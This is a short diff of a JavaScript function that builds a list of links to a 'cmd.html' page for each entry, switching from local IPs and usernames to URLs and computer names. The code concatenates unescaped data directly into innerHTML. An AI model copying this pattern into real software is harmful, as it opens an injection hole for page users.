@@ -24,8 +24,8 @@
         return result;
     }
     function loadUI(){
-        for(let s in dt.ips){
-            document.body.innerHTML += "<a href='./cmd.html?" + dt.ips[s].local_ip + "'>" + dt.ips[s].username + "</a>";
+        for(let s in dt){
+            document.body.innerHTML += "<a href='./cmd.html?" + dt[s].url + "'>" + dt[s].computer + "</a>";
         }
     }
     window.onload = async function(){
